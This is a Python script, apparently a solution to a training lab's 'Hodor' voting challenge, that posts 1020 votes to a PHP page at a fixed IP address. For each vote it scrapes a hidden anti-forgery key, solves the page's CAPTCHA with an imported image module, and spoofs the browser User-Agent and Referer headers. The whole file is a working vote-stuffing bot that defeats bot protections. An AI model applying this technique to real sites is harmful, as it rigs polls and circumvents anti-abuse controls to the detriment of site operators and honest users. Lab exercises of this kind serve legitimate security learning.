#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
from process_image import process_image

url_hodor = "http://158.69.76.135/level5.php"


def captcha_solver(session):
    return process_image(session)


def current_session(session):
    current = session.get(url_hodor)
    soup = BeautifulSoup(current.text, "html.parser")
    result = soup.find_all('input', {'type': 'hidden'})
    return {
        "session": {
            "id": "4386",
            "holdthedoor": "Submit",
            "key": result[0].get("value"),
            "captcha": captcha_solver(session)
        },
        "headers": {
            "referer": url_hodor,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }
    }


solved = 0
total = 0
with requests.session() as session:
    while solved < 1020:
        data = current_session(session)
        res = session.post(
            url=url_hodor,
            data=data["session"],
            headers=data["headers"],
        )
        # print(res.text)
        if 'See you later' in res.text:
            print("Captcha failed")
        else:
            solved += 1
            print(f"Vote count: {solved}")
        total += 1
        print(f"Summary: {solved}/{total}")
